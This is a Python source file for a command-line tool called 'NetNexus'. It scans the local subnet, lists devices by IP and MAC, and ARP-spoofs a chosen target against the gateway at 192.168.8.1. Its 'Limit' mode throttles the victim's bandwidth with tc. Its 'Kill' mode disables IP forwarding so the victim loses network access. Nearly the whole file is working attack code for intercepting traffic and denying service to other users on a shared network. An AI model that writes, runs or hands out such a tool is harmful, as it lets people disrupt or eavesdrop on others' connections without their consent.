import scapy.all as scapy
import os, time, sys, subprocess, threading
from core import scanner, spoof

device_memory = {}
stop_scanner = False

def set_forwarding(state):
    if state:
        subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"], capture_output=True)
        subprocess.run(["sudo", "sysctl", "-w", "net.ipv6.conf.all.disable_ipv6=0"], capture_output=True)
    else:
        subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=0"], capture_output=True)
        subprocess.run(["sudo", "sysctl", "-w", "net.ipv6.conf.all.disable_ipv6=1"], capture_output=True)

def apply_limit(iface, kbps):
    subprocess.run(["sudo", "tc", "qdisc", "del", "dev", iface, "root"], capture_output=True)
    subprocess.run(["sudo", "tc", "qdisc", "add", "dev", iface, "root", "tbf", "rate", f"{kbps}kbit", "latency", "50ms", "burst", "1540"], check=True)

def background_scanner(ip_range):
    global device_memory, stop_scanner
    while not stop_scanner:
        new_devices = scanner.scan(ip_range)
        device_memory.update(new_devices)
        time.sleep(2)

def main():
    global device_memory, stop_scanner
    iface = "wlan0"
    scapy.conf.iface = iface
    
    if os.getuid() != 0:
        print("[-] Root required.")
        return

    gateway_ip = "192.168.8.1"
    ip_range = f"{gateway_ip}/24"

    threading.Thread(target=background_scanner, args=(ip_range,), daemon=True).start()

    while True:
        os.system('clear')
        print("="*40)
        print("          NetNexus")
        print("="*40)
        
        current_list = list(device_memory.values())
        for i, dev in enumerate(current_list):
            print(f"{i}\t{dev['ip']}\t{dev['mac']}")
        
        print("-" * 40)
        print("Scanning... (Automatic Refresh)")
        choice = input("\nID (or 'q' to quit): ").lower()
        
        if choice == 'q': 
            stop_scanner = True
            break

        try:
            target = current_list[int(choice)]
            print(f"\n[1] Limit (kbps)  [2] Kill")
            mode = input("Action: ")

            gateway_mac, _ = spoof.get_device_info(gateway_ip)
            
            if mode == "1":
                kbps = input("kbps: ")
                set_forwarding(True)
                apply_limit(iface, kbps)
                wait_time = 0.5
            elif mode == "2":
                set_forwarding(False)
                wait_time = 0.001
            else: continue

            print(f"[*] Active on {target['ip']}... Ctrl+C to switch target.")
            while True:
                spoof.spoof(target['ip'], gateway_ip, target['mac'], gateway_mac)
                time.sleep(wait_time)
                
        except KeyboardInterrupt:
            set_forwarding(True)
            subprocess.run(["sudo", "tc", "qdisc", "del", "dev", iface, "root"], capture_output=True)
            continue
        except Exception as e:
            print(f"[-] Error: {e}")
            time.sleep(2)

if __name__ == "__main__":
    main()
